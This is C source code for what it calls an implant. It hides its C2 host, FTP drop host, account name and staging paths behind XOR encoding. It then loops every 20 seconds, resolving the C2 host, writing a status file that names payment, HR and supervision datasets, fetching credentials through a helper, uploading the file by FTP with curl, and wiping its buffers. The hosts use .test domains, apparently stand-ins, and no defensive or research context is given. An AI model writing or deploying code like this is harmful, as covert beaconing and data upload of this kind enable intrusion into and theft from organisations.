#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define XKEY 0x5a

static const unsigned char enc_agent[] = {0x3f, 0x2a, 0x77, 0x6a, 0x6a, 0x63, 0x00};
static const unsigned char enc_c2[] = {0x2f, 0x2a, 0x3e, 0x3b, 0x2e, 0x3f, 0x74, 0x39, 0x38, 0x29, 0x36, 0x77, 0x28, 0x3f, 0x39, 0x35, 0x28, 0x3e, 0x29, 0x74, 0x2e, 0x3f, 0x29, 0x2e, 0x00};
static const unsigned char enc_ftp_host[] = {0x3c, 0x2e, 0x2a, 0x74, 0x39, 0x38, 0x29, 0x36, 0x77, 0x28, 0x3f, 0x39, 0x35, 0x28, 0x3e, 0x29, 0x74, 0x2e, 0x3f, 0x29, 0x2e, 0x00};
static const unsigned char enc_archive_key[] = {0x6e, 0x3b, 0x6d, 0x3c, 0x69, 0x39, 0x63, 0x6b, 0x38, 0x68, 0x3e, 0x6a, 0x3f, 0x62, 0x6c, 0x6f, 0x00};
static const unsigned char enc_user[] = {0x29, 0x33, 0x2e, 0x3f, 0x38, 0x3b, 0x39, 0x31, 0x2f, 0x2a, 0x00};
static const unsigned char enc_cache[] = {0x75, 0x2e, 0x37, 0x2a, 0x75, 0x74, 0x39, 0x3b, 0x39, 0x32, 0x3f, 0x00};
static const unsigned char enc_pulse[] = {0x75, 0x2e, 0x37, 0x2a, 0x75, 0x74, 0x39, 0x3b, 0x39, 0x32, 0x3f, 0x75, 0x2a, 0x2f, 0x36, 0x29, 0x3f, 0x74, 0x2e, 0x22, 0x2e, 0x00};

struct implant_state {
  char agent[16];
  char c2[64];
  char ftp_host[64];
  char archive_key[32];
  unsigned int interval_sec;
  unsigned long upload_count;
};

static struct implant_state state;

static void decode(const unsigned char *src, char *dst, size_t dst_len) {
  size_t i;
  for (i = 0; i + 1 < dst_len && src[i] != 0x00; i++) {
    dst[i] = (char)(src[i] ^ XKEY);
  }
  dst[i] = '\0';
}

static void burn(char *s, size_t n) {
  volatile char *p = s;
  while (n--) {
    *p++ = 0;
  }
}

static void resolve_marker(const char *name) {
  struct addrinfo hints;
  struct addrinfo *res = NULL;
  memset(&hints, 0, sizeof(hints));
  hints.ai_socktype = SOCK_STREAM;
  if (getaddrinfo(name, NULL, &hints, &res) == 0 && res) {
    freeaddrinfo(res);
  }
}

static void write_pulse(const char *path) {
  FILE *f;
  time_t now = time(NULL);
  f = fopen(path, "w");
  if (!f) {
    return;
  }
  fprintf(f, "agent=%s\n", state.agent);
  fprintf(f, "host=cbfs01\n");
  fprintf(f, "count=%lu\n", state.upload_count);
  fprintf(f, "utc=%ld\n", (long)now);
  fprintf(f, "dataset=supervision,payments,hr\n");
  fclose(f);
}

static int run_helper(const char *host, const char *user, const char *netrc) {
  pid_t pid;
  int status = 0;
  pid = fork();
  if (pid == 0) {
    execl("/usr/local/lib/wupd_cred_helper", "wupd_cred_helper",
          "--profile", "cbfs01",
          "--host", host,
          "--user", user,
          "--netrc", netrc,
          (char *)NULL);
    _exit(127);
  }
  if (pid < 0) {
    return -1;
  }
  if (waitpid(pid, &status, 0) < 0) {
    return -1;
  }
  return status == 0 ? 0 : -1;
}

static void upload_pulse(const char *path) {
  char user[32], url[160], netrc[] = "/dev/shm/.wupd_netrc.XXXXXX";
  int fd;
  pid_t pid;
  int status = 0;
  decode(enc_user, user, sizeof(user));
  fd = mkstemp(netrc);
  if (fd < 0) {
    burn(user, sizeof(user));
    return;
  }
  close(fd);
  if (run_helper(state.ftp_host, user, netrc) != 0) {
    unlink(netrc);
    burn(user, sizeof(user));
    return;
  }
  snprintf(url, sizeof(url), "ftp://%s/incoming/%s.txt", state.ftp_host, state.agent);
  pid = fork();
  if (pid == 0) {
    execlp("curl", "curl", "-s", "--connect-timeout", "3",
           "--netrc-file", netrc, "--ftp-create-dirs",
           "-T", path, url, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    waitpid(pid, &status, 0);
  }
  unlink(netrc);
  burn(user, sizeof(user));
  burn(url, sizeof(url));
  burn(netrc, sizeof(netrc));
}

int main(void) {
  char cache_dir[32], pulse_path[64];
  decode(enc_agent, state.agent, sizeof(state.agent));
  decode(enc_c2, state.c2, sizeof(state.c2));
  decode(enc_ftp_host, state.ftp_host, sizeof(state.ftp_host));
  decode(enc_archive_key, state.archive_key, sizeof(state.archive_key));
  decode(enc_cache, cache_dir, sizeof(cache_dir));
  decode(enc_pulse, pulse_path, sizeof(pulse_path));
  state.interval_sec = 20;
  mkdir(cache_dir, 0755);
  for (;;) {
    resolve_marker(state.c2);
    resolve_marker(state.ftp_host);
    write_pulse(pulse_path);
    upload_pulse(pulse_path);
    state.upload_count++;
    sleep(state.interval_sec);
  }
  return 0;
}
